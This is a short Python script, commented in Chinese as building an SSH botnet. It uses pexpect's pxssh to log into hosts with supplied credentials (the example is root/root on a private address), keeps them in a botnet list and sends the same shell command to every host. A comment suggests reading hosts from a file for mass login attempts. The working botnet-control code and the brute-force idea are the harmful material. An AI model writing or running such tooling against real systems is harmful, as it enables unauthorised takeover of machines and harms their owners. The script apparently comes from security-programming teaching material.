# 构建ssh僵尸网络,
import optparse
from pexpect import pxssh

class Client():
    def __init__(self,host,user,password):
        self.host=host
        self.user=user
        self.password=password
        self.session=self.connect()

    def connect(self):
        try:
            s=pxssh.pxssh()
            s.login(self.host,self.user,self.password)
            return s
        except Exception as e:
            print(e)
            print('Error Connecting')
    def send_command(self,cmd):
        self.session.sendline(cmd)
        self.session.prompt()
        return self.session.before
def botnetCommand(command):
    for client in botNet:
        output=client.send_command(command)
        print('[*] output from '+client.host)
        print('[+] '+str(output)+'\n')
def addClient(host,user,password):
    client=Client(host,user,password)
    botNet.append(client)
botNet=[]
addClient('10.10.10.100','root','root')  #可以读取文件，批量读入，实现批量尝试
botnetCommand('uname -v')